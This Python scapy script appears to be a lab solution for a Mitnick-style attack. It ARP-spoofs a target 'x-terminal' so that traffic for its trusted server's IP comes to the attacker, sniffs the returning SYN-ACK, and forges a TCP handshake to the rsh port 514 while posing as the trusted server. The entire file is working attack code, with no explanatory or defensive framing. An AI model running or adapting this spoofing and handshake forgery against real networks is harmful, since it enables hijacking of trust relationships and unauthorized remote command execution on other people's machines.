from scapy.all import *
import subprocess
import threading
import re

TRUSTED_SERVER = "10.9.0.6"
X_TERMINAL = "10.9.0.5"
ATTACKER_IP = "10.9.0.1"
RSH_PORT = 514

DUMMY_IP = "10.9.0.2"

def get_interface_name():
    result = subprocess.run(['ifconfig', '-a'], stdout=subprocess.PIPE)
    output = result.stdout.decode()

    interface_regex = re.compile(r'^(br-\w+):', re.MULTILINE)

    interfaces = interface_regex.findall(output)
    return interfaces[0]


def get_mac(ip_address):
    arp_request = ARP(op=1, psrc=DUMMY_IP, pdst=ip_address)
    arp_response = sr1(arp_request, timeout=2, verbose=0)

    return arp_response.hwsrc


def spoof(target_ip, spoof_ip):
    arp_response = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)

    while True:
        send(arp_response, verbose=0)
        time.sleep(1)


def handle_synack(package):
    if package.haslayer(TCP) and package[TCP].flags == 'SA':
        print("Received SYN-ACK packet")

        print(f"Package ack: {package.ack} - package seq: {package.seq}")

        ack_packet = IP(src=TRUSTED_SERVER, dst=X_TERMINAL) / TCP(dport=RSH_PORT, flags='A', seq=package.ack, ack=package.seq + 1)
        send(ack_packet)

        print("Sent ACK packet, handshake completed")


def sniff_synack(interface):
    my_mac = get_if_hwaddr(get_interface_name())
    sniff_filter = f"ether dst {my_mac}"
    
    sniff(iface=interface, filter=sniff_filter, prn=handle_synack, store=0)


if __name__ == "__main__":
    print(f"Start spoofing the x-terminal - {X_TERMINAL}")
    spoofing_thread = threading.Thread(target=spoof, args=(X_TERMINAL, TRUSTED_SERVER))
    spoofing_thread.start()

    print("starting sniffing for the SYNACK")
    thread = threading.Thread(target=sniff_synack, args=(get_interface_name(),))
    thread.start()

    print(f"Faking 3-way handshake...")
    syn_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL) / TCP(dport=RSH_PORT, flags="S")
    send(syn_package, verbose=0)
